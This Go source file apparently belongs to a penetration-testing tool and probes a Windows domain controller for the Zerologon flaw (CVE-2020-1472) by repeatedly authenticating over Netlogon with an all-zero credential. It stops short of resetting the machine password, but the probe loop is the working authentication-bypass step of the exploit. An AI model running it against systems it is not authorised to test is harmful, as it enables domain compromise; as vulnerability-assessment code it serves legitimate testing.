package enumeration

import (
	"fmt"

	netlogon "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-01234567cffb/1.0"
	netlogonfunctions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-01234567cffb/1.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	msnrpc "github.com/TheManticoreProject/Manticore/windows/protocols/ms-nrpc"

	gofenrirsmb "github.com/0xbbuddha/GoFenrir/protocols/smb"
)

// zerologonMaxAttempts bounds the probe loop. Each attempt has ~1/256 odds of
// succeeding against a vulnerable DC, so 2000 gives ~99.96% detection (impacket's
// value); a vulnerable DC almost always trips within the first few hundred.
const zerologonMaxAttempts = 2000

// zerologonFlags are the negotiation flags with the "secure RPC" (sign/seal) bit
// cleared — the state CVE-2020-1472 abuses to send an all-zero credential.
const zerologonFlags = ndr.DWORD(0x212fffff)

type ZerologonResult struct {
	DCName     string
	Vulnerable bool
	Attempts   int
}

// CheckZerologon tests the DC for CVE-2020-1472 (Zerologon) WITHOUT changing the
// machine account password: it only probes NetrServerAuthenticate3 with an all-zero
// client credential. A single success means the DC is vulnerable. This is the safe,
// detection-only half of the attack — it never calls NetrServerPasswordSet2.
func CheckZerologon(session *gofenrirsmb.Session) (*ZerologonResult, error) {
	dcName := session.Client.ServerIdentity().NetBIOSComputerName
	if dcName == "" {
		return nil, fmt.Errorf("could not determine the DC NetBIOS name (target it by hostname, not IP)")
	}

	transport, err := session.Client.RPCTransport(netlogon.PipeName)
	if err != nil {
		return nil, fmt.Errorf("open %s: %w", netlogon.PipeName, err)
	}
	rpc := dcerpcclient.NewClient(transport)
	if err := rpc.Bind(netlogon.SyntaxID()); err != nil {
		rpc.Close()
		return nil, fmt.Errorf("netlogon bind: %w", err)
	}
	defer rpc.Close()

	primary := `\\` + dcName
	primaryW := ndr.WSTR(primary)
	account := ndr.WSTR(dcName + "$")
	computer := ndr.WSTR(dcName)
	var zero msnrpc.NETLOGON_CREDENTIAL // 8 zero bytes

	res := &ZerologonResult{DCName: dcName}
	for i := 1; i <= zerologonMaxAttempts; i++ {
		if _, _, err := netlogonfunctions.NetrServerReqChallenge(rpc, primary, dcName, zero); err != nil {
			return nil, fmt.Errorf("NetrServerReqChallenge: %w", err)
		}
		// On a patched DC this always fails (ACCESS_DENIED); on a vulnerable one the
		// zero credential validates roughly once every 256 tries.
		if _, _, _, aerr := netlogonfunctions.NetrServerAuthenticate3(rpc, &primaryW, account, msnrpc.ServerSecureChannel, computer, zero, zerologonFlags); aerr == nil {
			res.Vulnerable = true
			res.Attempts = i
			return res, nil
		}
	}
	res.Attempts = zerologonMaxAttempts
	return res, nil
}
